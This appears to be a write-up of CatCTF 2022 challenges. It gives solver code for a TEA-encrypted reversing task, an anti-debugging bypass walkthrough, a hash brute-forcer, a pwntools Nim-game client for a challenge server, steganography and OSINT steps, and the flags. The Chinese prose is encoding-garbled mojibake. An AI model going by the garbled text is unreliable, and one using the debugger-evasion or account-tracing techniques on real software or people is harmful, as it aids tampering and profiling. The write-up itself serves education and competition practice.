<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">data</span>&#123;</span></span><br><span class="line">    BYTE raw[<span class="number">32</span>];</span><br><span class="line">    DWORD data[<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">BYTE ciphers[] = &#123;</span><br><span class="line"><span class="number">0xAA</span>, <span class="number">0x7D</span>, <span class="number">0x07</span>, <span class="number">0x7D</span>, <span class="number">0xB1</span>, <span class="number">0xF7</span>, <span class="number">0x80</span>, <span class="number">0x71</span>, <span class="number">0xDA</span>, <span class="number">0xAF</span>, <span class="number">0x23</span>, <span class="number">0xE5</span>, <span class="number">0x10</span>, <span class="number">0x07</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x1E</span>, <span class="number">0xF7</span>, <span class="number">0x7D</span>, <span class="number">0x71</span>, <span class="number">0xE6</span>, <span class="number">0x78</span>, <span class="number">0x74</span>, <span class="number">0x56</span>, <span class="number">0x9B</span>, <span class="number">0xC0</span>, <span class="number">0x53</span>, <span class="number">0x11</span>, <span class="number">0xF3</span>, <span class="number">0x39</span>, <span class="number">0x31</span>, <span class="number">0x2E</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123; <span class="number">0x18bc8a17</span>, <span class="number">0x29d3ce1e</span>, <span class="number">0x42f740e3</span>, <span class="number">0x199c7f4a</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span> <span class="params">(DWORD* v, DWORD* k)</span> &#123;  </span><br><span class="line">    DWORD round = <span class="number">28</span>;</span><br><span class="line">    DWORD delta=<span class="number">0xCA7C7F00</span>;    </span><br><span class="line"></span><br><span class="line">    DWORD v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=delta*round, i; </span><br><span class="line">    DWORD k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];  </span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;round; i++) &#123; </span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);  </span><br><span class="line">        sum -= delta;  </span><br><span class="line">    &#125;                              </span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="keyword">sizeof</span>(data)/<span class="number">8</span>;++i)</span><br><span class="line">        decrypt(&amp;reinterpret_cast&lt;<span class="keyword">union</span> data*&gt;(ciphers)-&gt;data[<span class="number">2</span>*i], reinterpret_cast&lt;DWORD*&gt;(key));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="keyword">sizeof</span>(data);++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02X, &quot;</span>, reinterpret_cast&lt;<span class="keyword">union</span> data*&gt;(ciphers)-&gt;raw[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Part2</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">30</span>;i&gt;=<span class="number">0</span>;--i)</span><br><span class="line">        ciphers[i] ^= ciphers[i+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="keyword">sizeof</span>(data);++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, reinterpret_cast&lt;<span class="keyword">union</span> data*&gt;(ciphers)-&gt;raw[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="StupidOrangeCat2-xD"><a href="#StupidOrangeCat2-xD" class="headerlink" title="StupidOrangeCat2&#xD;"></a>StupidOrangeCat2&#xD;</h3><p>é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1nvAzABW9Fv34xe-WQwmoQw?pwd=21g7" title="https://pan.baidu.com/s/1nvAzABW9Fv34xe-WQwmoQw?pwd=21g7">https://pan.baidu.com/s/1nvAzABW9Fv34xe-WQwmoQw?pwd=21g7</a><br>æå–ç ï¼š21g7<br>--æ¥è‡ªç™¾åº¦ç½‘ç›˜è¶…çº§ä¼šå‘˜V4çš„åˆ†äº«</p>
<h3 id="The-cat-did-it"><a href="#The-cat-did-it" class="headerlink" title="The cat did it"></a>The cat did it</h3><h4 id="è®¾è®¡æ€è·¯å’Œè§£æ³•"><a href="#è®¾è®¡æ€è·¯å’Œè§£æ³•" class="headerlink" title="è®¾è®¡æ€è·¯å’Œè§£æ³•"></a>è®¾è®¡æ€è·¯å’Œè§£æ³•</h4><p>è¿™é‡Œå…ˆç»™å¸ˆå‚…ä»¬ç£•å¤´äº†</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/image_35swh0x-KO.png" class="">

<p>å¯èƒ½å¾ˆå¤šå¸ˆå‚…æ²¡æœ‰çœ‹æ‡‚è¿™ä¸ªé¢˜ç›®çš„æ„æ€ï¼Œç›´æ¥çŒœå‡ºäº†æ¦‚ç‡ä¸º0%ï¼ˆå…¶å®è¿™æ˜¯ä¿®æ”¹åçš„ï¼Œä¿®æ”¹å‰å¯èƒ½æ›´çœ‹ä¸æ‡‚ <a target="_blank" rel="noopener" href="https://www.desmos.com/calculator/wzuskcjd34?lang=zh-CN" title="https://www.desmos.com/calculator/wzuskcjd34">https://www.desmos.com/calculator/wzuskcjd34</a></p>
<p>æœ¬é¢˜æ˜¯æˆ‘åœ¨å­¦ä¹ æ¦‚ç‡è®ºæ—¶å‡ºçš„ï¼Œä¸è¿‡è¿™é‡Œä½œä¸ºç­¾åˆ°é¢˜ç›®å‡å»äº†å¤æ‚çš„è®¡ç®—åªéœ€è¦ç¨å¾®çš„åˆ†æä¸€ä¸‹å°±å¯ä»¥äº†ã€‚</p>
<p>è¿™é‡Œâ€œäººâ€åœ¨æ­£æ€åˆ†æ­¥çš„å‡½æ•°å›¾åƒä¸Šè¡Œèµ°ï¼Œï¼ˆè¿™é‡Œæ˜¯é‡‡ç”¨äº†ä¸­å¿ƒæé™å®šç†ï¼Œäººæ•°åº”è¯¥å¤Ÿäº†ğŸ˜¶ï¼‰è€Œå‡½æ•°ç»™åˆ°çš„å®šä¹‰åŸŸåœ¨`-200ä¹‹é—´ï¼ŒçŒ«çŒ«çš„å®šä¹‰åŸŸåŒ…å«æ­£æ€å‡½æ•°çš„å®šä¹‰åŸŸçš„ã€‚</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/image-1672646385574_TMufCm2CkE.png" class="">

<p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±å¾ˆç®€å•äº†ï¼Œæœ‰æ¦‚ç‡å¯†åº¦æ±‚åœ¨xåœ¨çŒ«çŒ«æ¨ªåæ ‡ä¹‹å¤–çš„æ¦‚ç‡ã€‚ç”±äºåªç»™äº†+-200ä¹‹é—´ï¼Œä¹‹é—´çš„å¤šä½™æ²¡æœ‰ç»™ï¼Œå¯¹ç«‹æ±‚ä¸€ä¸ªå¤§çº¦çš„æ¦‚ç‡ä¸º</p>
<p>$$<br>P &#x3D; \lfloor1 - (\Phi(\frac {200-b}a) - \Phi(\frac {-200-b}a)) \rfloor&#x3D; \lfloor 1-(1-2\Phi(\frac {-200-b}a)) \rfloor&#x3D;\lfloor2\Phi(\frac {-200-b}a)\rfloor<br>$$</p>
<p>å¯ä»¥å¾—åˆ°æ¦‚ç‡ä¸º0%</p>
<h4 id="çŒ«çŒ«é•‡æ¥¼"><a href="#çŒ«çŒ«é•‡æ¥¼" class="headerlink" title="çŒ«çŒ«é•‡æ¥¼"></a>çŒ«çŒ«é•‡æ¥¼</h4><p>å¯èƒ½è®©å¸ˆå‚…ä»¬åšçš„äº‘é‡Œé›¾é‡Œçš„ï¼Œå†æ¬¡ç£•å¤´äº†ï¼Œæ•´æˆçƒ‚æ´»äº†ã€‚</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/Cat_nlZQ234xAu.jpg" class="">

<p>å…¶å®è¿™é‡Œé¢æœ‰BGMçš„</p>
<p><a target="_blank" rel="noopener" href="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%252FfgjZFp4NZA2UpGnWN2k8%252Fuploads%252FwjX2bQFO6aTRM30TAoPc%252Fmusic.mp4?alt=media&token=15f34bd9-1187-4fb2-84c0-79646626c92a">spaces%252FfgjZFp4NZA2UpGnWN2k8%252Fuploads%252FwjX2bQFO6aTRM30TAoPc%252Fmusic.mp4</a></p>
<h3 id="BugCat"><a href="#BugCat" class="headerlink" title="BugCat"></a>BugCat</h3><h4 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h4><p>è¿™é‡Œç»™å‡ºçš„æ˜¯ä¸€ä¸ªé¢„è®¾è§£ï¼Œè¿™ä¸ªè§£æ³•å¯èƒ½ä¸ä¼šæ˜¯ç¬¬ä¸€æ¬¡åˆ†æè¯¥é¢˜å°±å¯ä»¥è”æƒ³åˆ°çš„ï¼Œä¸è¿‡å´æ˜¯è§£é¢˜æœ€å¿«çš„æ€è·¯ï¼Œç”±äºè¯¦ç»†çš„æ€è·¯æ¶‰åŠåˆ°å‡ºé¢˜ç›¸å…³çš„ç»†èŠ‚ï¼Œè€Œä¸”åŒ…å«è®¸å¤šå‰ç½®çŸ¥è¯†ç‚¹ï¼Œä¼šåœ¨åæœŸæ›´æ–°åˆ°å¦‚ä¸‹ä¸“æ ä¸­ï¼Œå¹¶ç»™å‡ºä»é€‰æ‰‹è§’åº¦æ¥è¯´çš„é¢„æœŸæ”»å‡»æ–¹æ¡ˆä»¥åŠä»å‡ºé¢˜äººè§’åº¦å¯¹é¢˜ç›®çš„ä¸€äº›åˆ†æ</p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/read/readlist/rl656546" title="å‡ºé¢˜å°è®°">å‡ºé¢˜å°è®°</a></p>
<h4 id="äºŒã€è§£é¢˜æ–¹æ¡ˆ"><a href="#äºŒã€è§£é¢˜æ–¹æ¡ˆ" class="headerlink" title="äºŒã€è§£é¢˜æ–¹æ¡ˆ"></a>äºŒã€è§£é¢˜æ–¹æ¡ˆ</h4><p>æ‰“å¼€ç¨‹åºï¼Œè¢«è¦æ±‚è¾“å…¥ç‰¹å®šå­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬ç®€å•åˆ†æå¯å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯</p>
<ol>
<li>è¾“å…¥å†…å®¹ä¸º**flag{xxxxxxxxxxxxxxxxxxxxxxxx}**ï¼Œé•¿åº¦ä¸º30</li>
<li>ä»£ç å†…å¤¹æ‚ç€å¤§é‡èŠ±æŒ‡ä»¤</li>
<li>ä»£ç æ³¨å†Œäº†VEHå¼‚å¸¸å›è°ƒï¼Œå¹¶åœ¨å…¶ä¸­å¸ƒç½®äº†4ä¸ªç¡¬ä»¶æ–­ç‚¹ä¸”ä¼šåœ¨ç‰¹å®šæƒ…å†µä¸‹ä¿®æ”¹å¯„å­˜å™¨çš„å€¼</li>
<li>ä¸»ä½“ä»£ç æ²¡æœ‰èŠ±æŒ‡ä»¤ï¼Œéå¸¸æ¸…æ™°ï¼Œæ˜¯å¯¹flagæ‹¬å·å†…çš„å†…å®¹è¿›è¡Œhashcodeï¼Œç„¶åä¸å†…ç½®å€¼æ¯”è¾ƒ</li>
</ol>
<p>æˆ‘ä»¬é¦–å…ˆåˆ†æä¸»ä½“ä»£ç ï¼Œä¼šå‘ç°å¦‚æœæŒ‰è¿™ä¸ªé€»è¾‘è®¡ç®—hashcodeï¼Œå¿…ç„¶å­˜åœ¨å¤šè§£ï¼Œæ ¹æ®é¢˜ç›®æè¿°å¯çŸ¥ï¼Œç®—æ³•å­˜åœ¨BUGï¼Œé‚£ä¹ˆæ³¨å†Œçš„å¼‚å¸¸å¤„ç†éƒ¨åˆ†åº”è¯¥å°±æ˜¯è´Ÿè´£ä¿®å¤BUGçš„å­˜åœ¨</p>
<p>è¿™é‡Œæˆ‘ä»¬é™„åŠ ç¨‹åºï¼Œå¤„ç†æ‰<strong>ZwSetInformationThread</strong>å‡½æ•°ï¼Œç„¶åä¿®æ”¹<strong>ZwCreateThreadEx</strong>å‡½æ•°çš„Flagså‚æ•°ä¸º2(è·³è¿‡TLSå›è°ƒ)ï¼Œä¹‹ååœ¨ä¸»ä½“ä»£ç int2dæŒ‡ä»¤åçš„ä»£ç å¤„ä¸‹æ–­ç‚¹ï¼Œè§‚å¯Ÿè°ƒè¯•å¯„å­˜å™¨ï¼Œå¾—åˆ°å››ä¸ªç¡¬ä»¶æ–­ç‚¹çš„ä½ç½®ï¼Œä¹‹ååˆ†åˆ«åœ¨ç›¸åº”ç¡¬ä»¶æ–­ç‚¹æ‰€å¯¹åº”ä»£ç å‰åä¸‹æ–­ç‚¹ï¼Œè°ƒè¯•æ‰§è¡Œï¼Œæ ¹æ®å‰åå¯„å­˜å™¨çš„å˜åŒ–ä»¥åŠè¢«ä¸‹æ–­ç‚¹çš„ä»£ç çš„åŸå§‹ä½œç”¨å¯ä»¥å¾—å‡ºä»¥ä¸‹ä¿¡æ¯</p>
<ol>
<li>flagå†…çš„å†…å®¹è¢«å››ä¸ªä¸€ç»„è¿›è¡Œhashcodeçš„è®¡ç®—</li>
<li>ä¹˜å­çš„å€¼ä¸º257</li>
<li>æ¯æ¬¡hashå¼‚æˆ–çš„å€¼ä¼šæ ¹æ®å¯ç”¨æ–­ç‚¹ä½ç½®åŠæ•°é‡çš„ä¸åŒè€Œå˜åŒ–ï¼Œè€ƒè™‘åˆ°æ˜¯CRCçš„æ ¡éªŒå€¼</li>
<li>æ­£ç¡®çš„flagè®¡ç®—ç»“æœåº”è¯¥ä»å†…ç½®çš„æ•°ç»„ä¸‹æ ‡(ä»0å¼€å§‹)2å¤„è¯»å–</li>
</ol>
<p>å¯¹äºå¯»æ‰¾CRCæ ¡éªŒï¼Œæˆ‘ä»¬åœ¨å¯ä»¥GetModuleHandleAä¸‹æ–­ç‚¹ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€å¤„è¢«åŠ äº†å¤§é‡èŠ±æŒ‡ä»¤çš„ä»£ç ï¼Œç®€å•åˆ†æå¯ä»¥çŸ¥é“è¿™é‡Œæ˜¯ä¸€å¤„crcæ ¡éªŒç”¨ä»£ç ï¼Œè¿™é‡Œç›´æ¥é‡æ–°è½½å…¥ç¨‹åºï¼Œé‡è®¾EIPåˆ°CRCæ ¡éªŒå¤„ï¼Œåœ¨ntdll.LdrxCallInitRoutineçš„è¿”å›å¤„ä¸‹æ–­ç‚¹ï¼Œå³å¯å¾—åˆ°æ­£ç¡®çš„CRCæ ¡éªŒå€¼</p>
<p>è‡³æ­¤ï¼Œæˆ‘ä»¬å¾—åˆ°äº†è§£é¢˜æ‰€éœ€è¦çš„æ‰€æœ‰æ•°æ®ï¼Œå†™ä¸ªè„šæœ¬çˆ†ç ´å‡ºflagå³å¯</p>
<h4 id="ä¸‰ã€è§£é¢˜è„šæœ¬"><a href="#ä¸‰ã€è§£é¢˜è„šæœ¬" class="headerlink" title="ä¸‰ã€è§£é¢˜è„šæœ¬"></a>ä¸‰ã€è§£é¢˜è„šæœ¬</h4><p>æœ€ç»ˆè§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼Œå¤§çº¦åœ¨2åˆ†é’Ÿå†…å³å¯çˆ†ç ´å‡ºæ­£ç¡®çš„flag</p>
<p><strong>flag{bu9CAT+C@P0o-1S_s0-CUTe~}</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">hashTable = [<span class="number">0x66BF1BAC</span>, <span class="number">0x473AC6FC</span>, <span class="number">0x4433C0D0</span>, <span class="number">0x289B6CEF</span>, <span class="number">0x71A8B6EC</span>, <span class="number">0x53775C73</span>]</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(hashTable)):</span><br><span class="line">    flag.append(<span class="string">b&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">94</span>):</span><br><span class="line">    str1 = <span class="built_in">chr</span>(i1 + <span class="number">33</span>)</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">94</span>):</span><br><span class="line">        str2 = <span class="built_in">chr</span>(i2 + <span class="number">33</span>)</span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">94</span>):</span><br><span class="line">            str3 = <span class="built_in">chr</span>(i3 + <span class="number">33</span>)</span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">94</span>):</span><br><span class="line">                str4 = <span class="built_in">chr</span>(i4 + <span class="number">33</span>)</span><br><span class="line">                <span class="built_in">hash</span> = <span class="number">0</span></span><br><span class="line">                finalStr = (str1 + str2 + str3 + str4).encode()</span><br><span class="line">                <span class="keyword">for</span> every_char <span class="keyword">in</span> finalStr:</span><br><span class="line">                    <span class="built_in">hash</span> = <span class="number">257</span> * <span class="built_in">hash</span> + every_char</span><br><span class="line">                <span class="built_in">hash</span> ^= <span class="number">0x052251FF</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">hash</span> <span class="keyword">in</span> hashTable:</span><br><span class="line">                    flag[hashTable.index(<span class="built_in">hash</span>)] = finalStr</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure>

<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="catnim"><a href="#catnim" class="headerlink" title="catnim"></a>catnim</h3><p>nimåšå¼ˆè€Œå·²ï¼Œæœ‰å…´è¶£å¯ä»¥äº†è§£å…·ä½“çš„åšå¼ˆæ€è·¯ä»¥åŠé€‰æ‹©çš„æ€è·¯ï¼Œåªéœ€è¦ç¡®ä¿æˆ‘æ‹¿èµ°çš„æ—¶å€™æ‰€æœ‰çŸ³å¤´çš„å¼‚æˆ–å’Œä¸º0å³å¯ã€‚</p>
<h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pile</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Now pile: &#x27;</span>)</span><br><span class="line">    line=p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">    <span class="keyword">return</span> line.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_xor</span>(<span class="params">piles</span>):</span><br><span class="line">    v=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> piles:</span><br><span class="line">        v^=num</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;xor :&quot;</span>,v)</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose</span>(<span class="params">piles</span>):</span><br><span class="line">    v=get_xor(piles)</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> piles:</span><br><span class="line">        <span class="keyword">if</span> num-(num^v) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> i,num-(num^v)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>,<span class="literal">None</span></span><br><span class="line">p=remote(<span class="string">&#x27;223.112.5.156&#x27;</span>,<span class="number">55068</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;N&#x27;</span>)</span><br><span class="line">start=time.time()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    piles=get_pile()</span><br><span class="line">    pilesnum=[<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> piles]</span><br><span class="line">    where,cnt=choose(pilesnum)</span><br><span class="line">    <span class="built_in">print</span>(pilesnum)</span><br><span class="line">    s=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> pilesnum:</span><br><span class="line">        <span class="keyword">if</span> num==<span class="number">0</span>:</span><br><span class="line">            s+=<span class="number">1</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;where:&#x27;</span>,<span class="built_in">str</span>(where))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;count:&#x27;</span>,<span class="built_in">str</span>(cnt))</span><br><span class="line">    <span class="keyword">if</span> s==<span class="built_in">len</span>(pilesnum)-<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    piles=get_pile()</span><br><span class="line"><span class="built_in">print</span>(time.time()-start)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#print(pilesnum)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="miao"><a href="#miao" class="headerlink" title="miao~"></a>miao~</h3><p>ä¸‹è½½é™„ä»¶å¾—åˆ°ä¸€ä¸ªå«æœ‰éŸ³é¢‘æ–‡ä»¶çš„å›¾ç‰‡</p>
<p>åˆ†ç¦»å‡ºæ¥ä¸€ä¸ªwavï¼Œé€šè¿‡æ”¹å˜é¢‘è°±å¯ä»¥çœ‹åˆ°é‡Œé¢æœ‰ä¸€ä¸ªCatCTFçš„å­—æ ·ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥çŒœæµ‹è¿™æ˜¯ä¸€ä¸ªå¯†ç </p>
<p>å¯ä»¥å°è¯•å…³äºwavçš„éšå†™ï¼Œæ˜¯deepsoundï¼Œä½¿ç”¨å·¥å…·åŠ è½½æ–‡ä»¶ï¼Œæç¤ºéœ€è¦è¾“å…¥å¯†ç ï¼Œé‚£ä¹ˆå¯†ç å°±æ˜¯CatCTF</p>
<p>å¾—åˆ°flag.txtæ–‡ä»¶ï¼Œé‡Œé¢æœ‰å–µå‘œçš„å­—æ ·ï¼ŒçŒœæµ‹æ˜¯å…½è¯­ï¼Œæœç´¢å…½è¯­ç¿»è¯‘å™¨<a target="_blank" rel="noopener" href="https://roar.iiilab.com/" title="å…½éŸ³è¯‘è€…åœ¨çº¿ç¼–ç è§£ç  - å…½éŸ³ç¿»è¯‘å’†å“®ä½“åŠ å¯†è§£å¯† (iiilab.com)">å…½éŸ³è¯‘è€…åœ¨çº¿ç¼–ç è§£ç  - å…½éŸ³ç¿»è¯‘å’†å“®ä½“åŠ å¯†è§£å¯† (iiilab.com)</a></p>
<p>å¾—åˆ°æœ€åflag</p>
<p>CatCTF{d0_y0u_Hate_c4t_ba3k1ng <em>?</em> M1ao~}</p>
<h3 id="Peekaboo"><a href="#Peekaboo" class="headerlink" title="Peekaboo"></a>Peekaboo</h3><p>èº²çŒ«çŒ«ï¼Œé¢„æœŸè§£æ˜¯ä¸€ä¸ªosinté¢˜ç›®</p>
<p>é€šè¿‡é™„ä»¶å‘ç°æ°´å°ï¼Œæ˜¯ä¸€ä¸ªqqç©ºé—´ï¼Œæ‰¾åˆ°ç©ºé—´åå‘ç°æœ‰å¾ˆå¤šäºŒç»´ç ï¼ˆæˆ–è€…è¯´æ±‰ä¿¡ç ï¼‰</p>
<p>æ‰«ä¸€ä¸‹å‘ç°å”¯ä¸€æœ‰ç”¨çš„çº¿ç´¢ï¼šsina.å…”<code>*****</code>52258</p>
<p>æœç´¢å¾®åšç”¨æˆ·å…”52258å¯ä»¥æ‰¾åˆ°æœ‰å…³flagçš„ä¿¡æ¯</p>
<p>æ‰¾åˆ°ç”¨æˆ·çš„ç‹è€…è´¦å·ï¼Œç‹è€…è¥åœ°æœç´¢å¯¹åº”è´¦å·å¾—åˆ°æœ¬èµ›å­£åªä½¿ç”¨äº†ä¸€ä¸ªè‹±é›„ï¼šç™¾é‡Œç„ç­–</p>
<p>CatCTF{bailixuance}</p>
<h3 id="MeowMeow"><a href="#MeowMeow" class="headerlink" title="MeowMeow"></a>MeowMeow</h3><p>010æ‰“å¼€ç›´æ¥çœ‹ç­”æ¡ˆ</p>
<p>CatCTF{CAT_GOES_MEOW}</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/image_goDEqWj_50.png" class="">

<h3 id="CatFlag"><a href="#CatFlag" class="headerlink" title="CatFlag"></a>CatFlag</h3><p>åªæœ‰CatCTFæ‰èƒ½å‡ºCatéƒ½ä¼šæ‹¿çš„flag</p>
<p><code>cat flag</code>ï¼Œå°±èƒ½é€šè¿‡çŒ«çŒ«æ‹¿åˆ°flagäº†</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2023-01-03-00-33-09_rHRFbFYYAp.png" class="">

<p>Windowsä¸‹PowerShellä¹Ÿèƒ½é€šè¿‡çŒ«çŒ«æ‹¿flag</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2023-01-03-00-34-11_rI5qqMDazg.png" class="">

<p>Windowsä¸‹cmdå¯ä»¥æ‰“å­—å‡ºflag <code>type flag</code></p>
<img src="/2023/01/01/Nepnep-CatCTF2022/2023-01-03-00-37-22_CAgQXDRFRA.png" class="">

<p><del>ä»€ä¹ˆï¼Ÿä½ è¦é€šè¿‡è®°äº‹æœ¬vim010Editoræ‹¿flag? ç³Šä½ çŒ«è„¸.png</del></p>
<p>æœ‰éƒ¨åˆ†é€‰æ‰‹å…ˆ<code>strings flag</code>ï¼Œè¯·ä¸è¦è¿™æ ·åš</p>
<p>PS1ï¼šå‡ºé¢˜åŸç†</p>
<p><code>ANSI escape code</code></p>
